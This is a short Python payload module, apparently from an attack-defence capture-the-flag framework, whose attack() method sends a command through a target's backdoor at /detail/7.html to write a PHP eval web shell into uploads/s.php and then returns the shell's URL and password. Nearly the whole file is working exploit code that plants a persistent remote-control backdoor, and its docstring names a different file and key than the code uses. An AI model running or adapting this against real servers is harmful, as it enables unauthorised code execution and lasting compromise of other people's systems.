'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from utils import Utils


class P(Payload):
    def attack(self):
        try:
            url = 'http://{0}/detail/7.html'.format(self.host)
            res = requests.post(url,data={
                '1':"echo '<?php @eval($_POST[c]);?>' >> ./uploads/s.php"
            },timeout=2)
            url2 = 'http://{0}/uploads/s.php'.format(self.host)
            res = requests.get(url2,timeout=2)
            if res.status_code == 200:
                return url2,'c'
            else:
                raise PayloadFailException('simple horse write fail')
        except Exception as e:
            raise PayloadFailException(str(e))


